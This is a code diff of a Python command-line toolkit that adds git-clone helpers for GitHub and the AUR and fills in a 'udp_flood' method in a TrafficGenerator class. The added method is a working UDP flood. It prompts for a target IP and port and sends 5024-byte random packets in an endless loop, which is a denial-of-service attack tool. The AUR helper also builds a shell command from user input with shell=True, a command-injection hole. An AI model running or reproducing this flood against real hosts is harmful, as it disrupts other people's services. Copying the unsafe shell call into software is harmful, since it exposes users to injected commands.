@@ -63,20 +63,39 @@ class RepoManager:
          print(style.bold_style(color.rgb_text(255, 165, 0,"\nApplication has been Interrupted body Keyboard")))
 
     def github(self):
-       pass
-    def aur(self):   
-      print(style.bold_style(color.rgb_text(255, 165, 0,"Please add a Repository Name to Started the Git Clone")))
-      repository_name = input("╰─▸")
-      if repository_name.endswith(".git"):
-       subprocess.run(["git", "clone", f"{self.aur_base}/" f"{repository_name}"])
-       cd_name_getting = os.path.splitext(repository_name)[0]
-       print(style.bold_style(color.rgb_text(0, 255, 0, f"Successfully directory name, {cd_name_getting}")))
-       if self.is_arch:
-        subprocess.run(f"cd {cd_name_getting} && ls", shell=True)
-       else:
-          print(style.bold_style(color.rgb_text(255, 0, 0, "You're not on a Arch Linux system")))
-      else:
+      try:
+       while True:
+        print("Please add Persons Github Name")
+        github_name = input("╰─▸")   
+        print("Please add a Repository Name to Started the Git Clone:")
+        repository_name = input("╰─▸")
+        if repository_name.endswith(".git"):
+         subprocess.run(["git", "clone", f"{self.github_base}/" f"{github_name}/" f"{repository_name}"])
+         cd_name_getting = os.path.splitext(repository_name)[0]
+         print(style.bold_style(color.rgb_text(0, 255, 0, f"Successfully directory name, {cd_name_getting}")))
+        else:
          print(style.bold_style(color.rgb_text(255, 0, 0,"Your input is not Container .git at the end")))
+      except KeyboardInterrupt:
+         pass
+
+    def aur(self):
+     try:
+       while True:   
+        print(style.bold_style(color.rgb_text(255, 165, 0,"Please add a Repository Name to Started the Git Clone")))
+        repository_name = input("╰─▸")
+        if repository_name.endswith(".git"):
+         subprocess.run(["git", "clone", f"{self.aur_base}/" f"{repository_name}"])
+         cd_name_getting = os.path.splitext(repository_name)[0]
+         print(style.bold_style(color.rgb_text(0, 255, 0, f"Successfully directory name, {cd_name_getting}")))
+         if self.is_arch:
+          subprocess.run(f"cd {cd_name_getting} && ls", shell=True)
+         else:
+           print(style.bold_style(color.rgb_text(255, 0, 0, "You're not on a Arch Linux system")))
+        else:
+         print(style.bold_style(color.rgb_text(255, 0, 0,"Your input is not Container .git at the end")))
+     except KeyboardInterrupt:
+        pass
+   
 
 class TrafficGenerator:
     options = {"1": "UPD", "2": "TCP", "3": "HTTP", "4": "Exit"}
@@ -112,8 +131,26 @@ class TrafficGenerator:
 
      except KeyboardInterrupt:
        print(style.bold_style(color.rgb_text(255, 165, 0,"\nApplication has been Interrupted body Keyboard")))
+
     def  udp_flood(self):
-        print("123")
+       try:
+         while True:
+           target_ip = input("put in ip --> ")
+           ipport = int(input("now put in ip port --> "))
+           client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #  Socket.AF_INET IS FOR IPv4, Socket.SOCK_DGRAM IS FOR UDP DATAGRAM BASED, CONNECTIONLESS  
+           client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # ALLOWS THE SOCKET TO REUSE A LOCAL ADDRESS (IP AND PORT)
+           packet = os.urandom(5024) # THIS GENERATES 5024 REANDOM BYTES
+           client.sendto(packet, (target_ip, ipport))
+           print(f"Targeting {target_ip}:{ipport} with UDP packet")
+           try:
+            while True:
+              client.sendto(packet, (target_ip, ipport))
+              print(f"Packet sent to {target_ip}:{ipport}")
+           except KeyboardInterrupt:
+             client.close()
+
+       except KeyboardInterrupt:
+        print(style.bold_style(color.rgb_text(255, 165, 0,"\nApplication has been Interrupted body Keyboard")))
 
 
 class SecurityToolkit:
